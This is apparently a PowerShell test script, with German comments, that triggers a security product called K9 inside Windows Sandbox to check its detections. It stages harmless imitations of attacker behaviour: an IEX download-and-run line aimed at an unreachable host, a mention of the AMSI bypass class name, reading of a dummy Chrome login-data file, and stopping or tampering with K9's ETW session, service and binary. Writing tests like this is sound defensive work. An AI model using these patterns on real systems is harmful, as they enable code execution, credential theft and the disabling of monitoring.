<#
  Testlauf "Ausbau Phase 1" IN DER WINDOWS-SANDBOX (offline reicht, frische Sandbox).
  Nur harmlose, selbst erzeugte Test-Schritte: Skripte gegen nicht erreichbare Adressen,
  ein selbst uebersetztes Testprogramm, Schein-Dateien mit Zufallsinhalt.
  Laeuft nur im Sandbox-Konto UND wenn der Projektordner nicht existiert (also nie auf dem PC).

  Aufruf (Sandbox, Administrator, ueber wsb exec):
    powershell -ExecutionPolicy Bypass -File C:\Testlabor\sandbox-test-ausbau1.ps1

  Erwartung:
    P0 Skriptblock mit FromBase64String + VirtualAlloc (ohne Richtlinie)                 -> Hoch SKRIPT:SPEICHER-LADEN (falls PowerShell ihn selbst protokolliert)
    P1 Skriptblock mit dem AMSI-Klassennamen (ohne Richtlinie, von PowerShell selbst protokolliert) -> Kritisch SKRIPT:AMSI-UMGEHUNG
    P1b derselbe AMSI-Klassenname mit Richtlinie (nach P2), danach Richtlinie aus           -> Kritisch SKRIPT:AMSI-UMGEHUNG; Werte entfernt
    P2 Richtlinie per "k9 powershell-protokoll an", dann Download-und-Ausfuehren-Skript  -> Hoch SKRIPT:LADEN-UND-AUSFUEHREN
    P3 Testprogramm mit Herkunftsvermerk "Internet" startet                                -> Mittel DOWNLOAD:UNSIGNIERT-GESTARTET (ohne "?token")
    P4 dasselbe Programm richtet eine Aufgabe ein und laesst PowerShell die Chrome-Datei lesen
                                                                                            -> KETTE:ANGRIFF Hoch, dann Kritisch
    S1 ETW-Sitzung von aussen gestoppt (logman)                                             -> Kritisch SELBSTSCHUTZ:ETW-GESTOPPT
    S2 Startart des Dienstes auf "manuell", Programmdatei k9.exe veraendert (11 min warten)
                                                                                            -> Kritisch SELBSTSCHUTZ:DIENST-STARTART, SELBSTSCHUTZ:DATEIEN-VERAENDERT
    S4 Dienst stoppen, k9.exe austauschen, sofort starten                                -> Kritisch SELBSTSCHUTZ:DATEIEN-VERAENDERT beim Start, Mittel SELBSTSCHUTZ:DIENST-NEUSTART
    (S3 ebenso: Mittel SELBSTSCHUTZ:DIENST-NEUSTART)
    U  k9 dienst aktualisieren mit veraenderten Dateien                                 -> KEIN Selbstschutz-Alarm; bei S2 nennt die Meldung nur k9.exe
    S3 Dienst gestoppt (2,5 min warten)                                                     -> Kritisch SELBSTSCHUTZ:DIENST-BEENDET (meldet der Agent)
#>
$ErrorActionPreference = 'Continue'
if ($env:USERNAME -ne 'WDAGUtilityAccount' -or (Test-Path 'C:\K9-Quelltext')) {
    Write-Host 'Nur in der Windows-Sandbox ausfuehren.'
    exit 1
}
$out = 'C:\Ergebnis'
$prog = 'C:\Testlabor\programm'
$inst = 'C:\Program Files\K9'
$k9 = Join-Path $inst 'k9.exe'
Start-Transcript -Path (Join-Path $out 'protokoll.txt') | Out-Null
function Step([string]$t) { Write-Host "`n=== $t ($(Get-Date -Format HH:mm:ss))" }
function Wait([int]$s, [string]$why) { Write-Host "  warte $s s ($why)"; Start-Sleep -Seconds $s }
function Run([string]$exe) { & $exe @args 2>&1 | Out-String | Write-Host; Write-Host "  (Exitcode $LASTEXITCODE)" }

Step 'A Schein-Datei anlegen'
$chrome = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Default\Login Data'
New-Item -ItemType Directory -Force (Split-Path $chrome -Parent) | Out-Null
$b = New-Object byte[] 4096; (New-Object Random).NextBytes($b); [IO.File]::WriteAllBytes($chrome, $b)

Step 'B Testprogramm uebersetzen (startet eine Aufgabe und PowerShell)'
$chromeCs = $chrome.Replace('\', '\\')
$src = @"
using System.Diagnostics;
public static class Prg {
    public static void Main() {
        var a = Process.Start("schtasks.exe", "/create /tn VS-Test-Aufgabe /tr notepad.exe /sc once /st 23:59 /f"); a.WaitForExit();
        var b = Process.Start("powershell.exe", "-NoProfile -Command [IO.File]::OpenRead('$chromeCs').Close(); Start-Sleep 3"); b.WaitForExit();
    }
}
"@
$tool = Join-Path $env:USERPROFILE 'Downloads\mod-tool.exe'
Add-Type -TypeDefinition $src -OutputAssembly $tool -OutputType ConsoleApplication
Write-Host "  Testprogramm: $tool ($((Get-Item $tool).Length) Bytes)"

Step 'C K9 installieren'
Run "$prog\k9.exe" dienst installieren
for ($i = 0; $i -lt 60 -and -not (Get-Process k9-agent -ErrorAction SilentlyContinue); $i++) { Start-Sleep 5 }
Wait 30 'ETW-Sitzung des Dienstes'

Step 'P0 Skriptblock mit FromBase64String und VirtualAlloc (ohne Richtlinie)'
$w = 'Virtual' + 'Alloc'
& ([scriptblock]::Create("`$b = [Convert]::FromBase64String('QUFBQQ=='); `$f = '$w'; [void]`$b.Length"))
Wait 10 'Meldung'

Step 'P1 Skriptblock mit dem AMSI-Klassennamen (ohne Richtlinie)'
# Der Name wird erst zur Laufzeit zusammengesetzt (diese Datei selbst enthaelt ihn nicht);
# der dabei erzeugte innere Skriptblock enthaelt ihn und wird von PowerShell protokolliert.
$t = 'System.Management.Automation.' + 'Amsi' + 'Utils'
& ([scriptblock]::Create("`$n = '$t'; [void]`$n.Length"))
Wait 10 'Meldung'

Step 'P2 Richtlinie einschalten, Download-und-Ausfuehren-Skript (Adresse nicht erreichbar)'
Run $k9 powershell-protokoll an
Run $k9 powershell-protokoll status
Run powershell.exe -NoProfile -Command "try { IEX (New-Object Net.WebClient).DownloadString('http://beispiel.invalid/x.ps1') } catch { 'nicht erreichbar (erwartet)' }"
Wait 10 'Meldung'
Step 'P1b AMSI-Klassenname mit eingeschalteter Richtlinie'
& ([scriptblock]::Create("`$n = '$t'; [void]`$n.Length"))
Wait 10 'Meldung'
Run $k9 powershell-protokoll aus
Run $k9 powershell-protokoll status
foreach ($k in 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging', 'HKLM:\SOFTWARE\Policies\Microsoft\PowerShellCore\ScriptBlockLogging') {
    $v = (Get-ItemProperty -Path $k -ErrorAction SilentlyContinue).EnableScriptBlockLogging
    Write-Host "  $k EnableScriptBlockLogging = $(if ($null -eq $v) { '(nicht vorhanden)' } else { $v })"
}

Step 'P3/P4 Testprogramm mit Herkunftsvermerk Internet starten'
Set-Content -Path "${tool}:Zone.Identifier" -Value "[ZoneTransfer]`r`nZoneId=3`r`nHostUrl=https://beispiel.invalid/mod-tool.exe?token=geheim123`r`n"
Get-Content -Path "${tool}:Zone.Identifier" | Write-Host
Run $tool
Wait 20 'Meldungen'
schtasks.exe /delete /tn VS-Test-Aufgabe /f | Out-Null

Step 'U Eigene Aktualisierung mit veraenderten Programmdateien (darf keinen Alarm ausloesen)'
$neu = 'C:\VS-Update'
New-Item -ItemType Directory -Force $neu | Out-Null
Copy-Item "$prog\*.exe" $neu
foreach ($f in 'k9.exe', 'k9-agent.exe', 'k9-dienst.exe') { Add-Content -Path (Join-Path $neu $f) -Value 'aktualisierung' }
Run "$neu\k9.exe" dienst aktualisieren
for ($i = 0; $i -lt 60 -and -not (Get-Process k9-agent -ErrorAction SilentlyContinue); $i++) { Start-Sleep 5 }
Wait 30 'Dienst und Agent laufen wieder'

Step 'S1 ETW-Sitzung von aussen stoppen'
Run logman.exe stop 'K9-Dienst-ETW' -ets
Wait 40 'Neustart der Sitzung und Meldung'

Step 'S2 Startart auf manuell, Programmdatei veraendern, 11 Minuten warten'
Run sc.exe config 'K9-Dienst' start= demand
Add-Content -Path $k9 -Value 'x'
Wait 660 'Pruefung alle 10 Minuten'
Run sc.exe config 'K9-Dienst' start= delayed-auto

Step 'S3 Dienst stoppen, 2,5 Minuten warten'
# K9 refuses a plain stop request since 0.33.0: stop through k9.
Run $k9 dienst stoppen
Wait 150 'Agent meldet'
Run sc.exe start 'K9-Dienst'
Wait 30 'Dienst laeuft wieder'

Step 'S4 Dienst stoppen, k9.exe austauschen, sofort wieder starten'
# K9 refuses a plain stop request since 0.33.0: stop through k9.
Run $k9 dienst stoppen
Wait 5 'gestoppt'
Add-Content -Path $k9 -Value 'austausch'
Run sc.exe start 'K9-Dienst'
Wait 40 'Pruefung beim Start'

Step 'Ergebnisse sammeln'
& "$prog\k9.exe" erkennungen --alle *> (Join-Path $out 'erkennungen.txt')
Get-ChildItem 'C:\ProgramData\K9\logs' -File -ErrorAction SilentlyContinue |
    ForEach-Object { Copy-Item $_.FullName (Join-Path $out ('dienst-' + $_.BaseName + '.log')) }
Get-ChildItem (Join-Path $env:LOCALAPPDATA 'K9\logs') -File -ErrorAction SilentlyContinue |
    ForEach-Object { Copy-Item $_.FullName (Join-Path $out ('agent-' + $_.BaseName + '.log')) }
Stop-Transcript | Out-Null
Write-Host "`nFertig. Ergebnisse in C:\Ergebnis."
